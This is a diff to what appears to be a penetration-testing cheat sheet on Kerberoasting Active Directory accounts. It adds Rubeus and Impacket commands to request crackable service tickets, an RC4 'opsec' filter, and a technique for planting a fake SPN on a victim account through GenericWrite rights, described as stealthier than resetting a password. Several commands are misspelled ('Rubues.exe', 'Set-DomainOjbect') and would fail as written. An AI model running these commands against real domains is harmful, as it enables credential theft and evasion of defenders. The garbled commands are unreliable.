@@ -18,7 +18,15 @@ Get-NetUser -SPN
 ```powershell
 Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrinicipalName
 ```
-### Requesting TGS
+- Rubeus
+```powershell
+# list kerberos stats
+.\Rubeus.exe kerberoast /stats
+
+# Look of kerberoastable account that only supports RC4_HMAC
+.\Rubues.exe kerberoast /stat /rc4opsec
+```
+### Requesting STs
 - Impacket's `GetUserSPNs.py` script can be used to query users with SPN and request STs for the service.
 ```bash
 # This will search for SPNs, request STs for the same using supplied credentials and same the STs in "kerberoast.hash"
@@ -39,5 +47,17 @@ Request-SPNTicket
 ```
 - Rubeus
 ```powershell
-.\Rubeus kerberoast /nowrap
+.\Rubeus kerberoast /nowrap [/user:<username>] /simple
+
+# for rc4_hmac account
+.\Rubeus kerberoast /nowrap [/user:<username>] /simple /rc4opsec
+```
+---
+If we have `GenericAll` or `GenericWrite` over a user, we can set a random SPN for that user, and request ST for it. This is opsec friendly as resetting a user password is noisy. SPN for a user can be set using (SPN should be unique for the forest): 
+```powershell
+# Powerview
+Set-DomainOjbect -Identity support30user -Set @{serviceprincipalname = 'dcorp/whatever'}
+
+# Ad module
+Set-ADUser -Identity support30user -ServicePrincipalNames @{Add='dcorp/whatever'}
 ```
